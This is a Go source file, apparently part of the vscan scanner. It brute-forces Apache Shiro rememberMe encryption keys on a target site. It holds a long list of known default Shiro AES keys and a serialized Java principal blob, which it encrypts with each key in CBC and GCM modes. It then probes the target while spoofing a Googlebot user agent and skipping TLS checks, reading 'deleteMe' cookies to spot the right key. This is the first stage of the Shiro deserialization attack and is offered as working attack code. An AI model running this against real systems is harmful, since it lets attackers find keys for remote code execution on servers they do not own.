package shiro

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/http"
	"net/url"
	"regexp"
	"time"
)

var (
	shirokeys = []string{"2AvVhdsgUs0FSA3SDFAdag==", "kPH+bIxk5D2deZiIxcaaaA==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "zSyK5Kp6PZAAjlT+eeNMlg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "bXdrXl9eNjY2KjA3Z2otPQ==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA==", "GsHaWo4m1eNbE0kNSMULhg==", "l8cc6d2xpkT1yFtLIcLHCg==", "KU471rVNQ6k7PQL4SqxgJg==", "0AvVhmFLUs0KTA3Kprsdag==", "1AvVhdsgUs0FSA3SDFAdag==", "25BsmdYwjnfcWmnhAciDDg==", "3JvYhmBLUs0ETA5Kprsdag==", "6AvVhmFLUs0KTA3Kprsdag==", "6NfXkC7YVCV5DASIrEm1Rg==", "7AvVhmFLUs0KTA3Kprsdag==", "8AvVhmFLUs0KTA3Kprsdag==", "8BvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==", "OUHYQzxQ/W9e/UjiAGu6rg==", "a3dvbmcAAAAAAAAAAAAAAA==", "aU1pcmFjbGVpTWlyYWNsZQ==", "bXRvbnMAAAAAAAAAAAAAAA==", "OY//C4rhfwNxCQAQCrQQ1Q==", "5J7bIJIV0LQSN3c9LPitBQ==", "f/SY5TIve5WWzT4aQlABJA==", "bya2HkYo57u6fWh5theAWw==", "WuB+y2gcHRnY2Lg9+Aqmqg==", "3qDVdLawoIr1xFd6ietnwg==", "YI1+nBV//m7ELrIyDHm6DQ==", "6Zm+6I2j5Y+R5aS+5ZOlAA==", "2A2V+RFLUs+eTA3Kpr+dag==", "6ZmI6I2j3Y+R1aSn5BOlAA==", "SkZpbmFsQmxhZGUAAAAAAA==", "2cVtiE83c4lIrELJwKGJUw==", "fsHspZw/92PrS3XrPW+vxw==", "XTx6CKLo/SdSgub+OPHSrw==", "sHdIjUN6tzhl8xZMG3ULCQ==", "O4pdf+7e+mZe8NyxMTPJmQ==", "HWrBltGvEZc14h9VpMvZWw==", "rPNqM6uKFCyaL10AK51UkQ==", "Y1JxNSPXVwMkyvES/kJGeQ==",
		"lT2UvDUmQwewm6mMoiw4Ig==", "MPdCMZ9urzEA50JDlDYYDg==", "xVmmoltfpb8tTceuT5R7Bw==", "c+3hFGPjbgzGdrC+MHgoRQ==", "ClLk69oNcA3m+s0jIMIkpg==", "Bf7MfkNR0axGGptozrebag==", "1tC/xrDYs8ey+sa3emtiYw==", "ZmFsYWRvLnh5ei5zaGlybw==", "cGhyYWNrY3RmREUhfiMkZA==", "IduElDUpDDXE677ZkhhKnQ==", "yeAAo1E8BOeAYfBlm4NG9Q==", "cGljYXMAAAAAAAAAAAAAAA==", "2itfW92XazYRi5ltW0M2yA==", "XgGkgqGqYrix9lI6vxcrRw==", "ertVhmFLUs0KTA3Kprsdag==", "5AvVhmFLUS0ATA4Kprsdag==", "s0KTA3mFLUprK4AvVhsdag==", "hBlzKg78ajaZuTE0VLzDDg==", "9FvVhtFLUs0KnA3Kprsdyg==", "d2ViUmVtZW1iZXJNZUtleQ==", "yNeUgSzL/CfiWw1GALg6Ag==", "NGk/3cQ6F5/UNPRh8LpMIg==", "4BvVhmFLUs0KTA3Kprsdag==", "MzVeSkYyWTI2OFVLZjRzZg==", "empodDEyMwAAAAAAAAAAAA==", "A7UzJgh1+EWj5oBFi+mSgw==", "c2hpcm9fYmF0aXMzMgAAAA==", "i45FVt72K2kLgvFrJtoZRw==", "U3BAbW5nQmxhZGUAAAAAAA==", "Jt3C93kMR9D5e8QzwfsiMw==", "MTIzNDU2NzgxMjM0NTY3OA==", "vXP33AonIp9bFwGl7aT7rA==", "V2hhdCBUaGUgSGVsbAAAAA==", "Q01TX0JGTFlLRVlfMjAxOQ==", "Is9zJ3pzNh2cgTHB4ua3+Q==", "NsZXjXVklWPZwOfkvk6kUA==", "GAevYnznvgNCURavBhCr1w==", "66v1O8keKNV3TTcGPK1wzg==", "SDKOLKn2J1j/2BHjeZwAoQ==", "kPH+bIxk5D2deZiIxcabaA==", "kPH+bIxk5D2deZiIxcacaA==", "3AvVhdAgUs0FSA4SDFAdBg==", "4AvVhdsgUs0F563SDFAdag==", "FL9HL9Yu5bVUJ0PDU1ySvg==", "5RC7uBZLkByfFfJm22q/Zw==", "eXNmAAAAAAAAAAAAAAAAAA==", "fdCEiK9YvLC668sS43CJ6A==", "FJoQCiz0z5XWz2N2LyxNww==", "HeUZ/LvgkO7nsa18ZyVxWQ==", "HoTP07fJPKIRLOWoVXmv+Q==", "iycgIIyCatQofd0XXxbzEg==", "m0/5ZZ9L4jjQXn7MREr/bw==", "NoIw91X9GSiCrLCF03ZGZw==", "oPH+bIxk5E2enZiIxcqaaA==", "QAk0rp8sG0uJC4Ke2baYNA==", "Rb5RN+LofDWJlzWAwsXzxg==", "s2SE9y32PvLeYo+VGFpcKA==", "SrpFBcVD89eTQ2icOD0TMg==", "U0hGX2d1bnMAAAAAAAAAAA==", "Us0KvVhTeasAm43KFLAeng==", "Ymx1ZXdoYWxlAAAAAAAAAA==", "YWJjZGRjYmFhYmNkZGNiYQ==", "zIiHplamyXlVB11UXWol8g==", "ZjQyMTJiNTJhZGZmYjFjMQ=="}
	checkContent = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
	shiro_url    string
)

func httpRequset(RememberMe string, keylen int) int {
	var tr *http.Transport
	if pkg.HttpProxy != "" {
		uri, _ := url.Parse(pkg.HttpProxy)
		tr = &http.Transport{
			MaxIdleConnsPerHost: -1,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			Proxy:               http.ProxyURL(uri),
		}
	} else {
		tr = &http.Transport{
			MaxIdleConnsPerHost: -1,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
		}
	}
	client := &http.Client{
		Timeout:   time.Duration(10) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse //不允许跳转
		}}
	req, err := http.NewRequest("HEAD", shiro_url, nil)
	if err != nil {
		return keylen
	}
	//设置请求头
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
	req.Header.Set("Cookie", "rememberMe="+RememberMe)
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()
	} else {
		return keylen
	}
	//判断rememberMe=deleteMe;是否在响应头中
	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}
	if resp.Header != nil {
		counts := regexp.MustCompile("rememberMe=deleteMe").FindAllStringIndex(SetCookieAll, -1)
		return len(counts)
	}
	return keylen
}

func findTheKey(key_len int, url string, Shirokeys string, Content []byte, keylen int) bool {
	key, _ := base64.StdEncoding.DecodeString(Shirokeys)
	RememberMe1 := aES_CBC_Encrypt(key, Content) //AES CBC加密
	RememberMe2 := aES_GCM_Encrypt(key, Content) //AES GCM加密
	if httpRequset(RememberMe1, keylen) != key_len {
		fmt.Println("[+] Url:", url)
		fmt.Println("[+] CBC-KEY:", Shirokeys)
		fmt.Println("[+] rememberMe=", RememberMe1)
		return true
	}
	if httpRequset(RememberMe2, keylen) != key_len {
		fmt.Println("[+] Url:", url)
		fmt.Println("[+] GCM-KEY:", Shirokeys)
		fmt.Println("[+] rememberMe=", RememberMe2)
		return true
	}
	return false
}

func keyCheck(url string) (key string) {
	key_len := httpRequset("1", 1)
	Content, _ := base64.StdEncoding.DecodeString(checkContent)
	isFind := false
	for i := range shirokeys {
		//time.Sleep(time.Duration(interval) * time.Second) //设置请求间隔
		isFind = findTheKey(key_len, url, shirokeys[i], Content, key_len)
		if isFind {
			return shirokeys[i]
		}
	}
	if !isFind {
		return ""
	}

	return ""
}

func Check(url string) (key string) {
	shiro_url = url
	key = keyCheck(url)
	return key
}